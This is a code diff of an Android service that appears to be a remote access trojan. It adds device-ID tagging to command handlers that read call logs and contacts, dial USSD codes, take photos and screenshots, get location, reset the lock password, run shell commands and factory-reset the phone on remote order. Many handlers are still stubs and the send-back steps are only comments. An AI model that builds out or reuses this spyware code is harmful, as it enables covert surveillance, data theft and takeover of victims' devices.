@@ -144,7 +144,8 @@ public class MainService extends Service {
         public void call(Object... args) {
             try {
                 JSONObject jsonObject = new JSONObject();
-                jsonObject = Voice.readCallLog(getApplicationContext());
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("data", Voice.readCallLog(getApplicationContext()));
                 if (jsonObject != null) {
                     // emit json
                 }else {
@@ -181,14 +182,20 @@ public class MainService extends Service {
     private Emitter.Listener dialUssd = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
-            String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
-            if(result == "No USSD code supplied") {
-                // emit fialed
-            } else if(result == "API level not supported"){
-                // emit somethibg
-            }
-            else{
-                // emit result
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+                String result = Voice.dialUSSD(args[0].toString(), getApplicationContext());
+                if(result == "No USSD code supplied") {
+                    // emit fialed
+                } else if(result == "API level not supported"){
+                    // emit somethibg
+                }
+                else{
+                    // emit result
+                }
+            } catch (Exception exception) {
+                Log.i("dialUSSD", exception.getMessage());
             }
         }
     };
@@ -196,14 +203,27 @@ public class MainService extends Service {
     private Emitter.Listener takePicture = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
-
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+//                jsonObject.put("bytes", );
+            } catch (Exception exception) {
+                Log.i("takePicture", exception.getMessage());
+            }
         }
     };
 
     private Emitter.Listener getCameraList = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
-            JSONObject cameraList = Camera.findCameraList();
+            try {
+                JSONObject cameraList = Camera.findCameraList();
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("cameraList", cameraList);
+            } catch (Exception exception) {
+                Log.i("getCameraList", exception.getMessage());
+            }
             // check if camera list isn't null then emit
         }
     };
@@ -212,6 +232,13 @@ public class MainService extends Service {
         @Override
         public void call(Object... args) {
             ScreenCapture.screencap();
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+
+            } catch (Exception exception) {
+                Log.i("screenshot", exception.getMessage());
+            }
         }
     };
 
@@ -220,6 +247,12 @@ public class MainService extends Service {
         public void call(Object... args) {
             // verify if image was set or not
             new SetWallpaper(getApplicationContext(), args[0].toString());
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+            } catch (Exception exception) {
+                Log.i("changeWallpaper", exception.getMessage());
+            }
             // emit
         }
     };
@@ -250,20 +283,39 @@ public class MainService extends Service {
         @Override
         public void call(Object... args) {
             Vibrate.vibratePhone(getApplicationContext(), Integer.parseInt(args[0].toString()));
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener writeContact = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener readContact = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
@@ -271,48 +323,91 @@ public class MainService extends Service {
         @Override
         public void call(Object... args) {
             new DeviceManager(getApplicationContext(), new ComponentName(getApplicationContext(), MainActivity.class)).resetPassword("replace with new password");
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener sendSerialCommand = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener shCommand = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener getLocation = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener changeDevicePassword = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener factoryResetDevice = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
     private Emitter.Listener rebootDevice = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
 
+            } catch (Exception exception) {
+
+            }
         }
     };
 
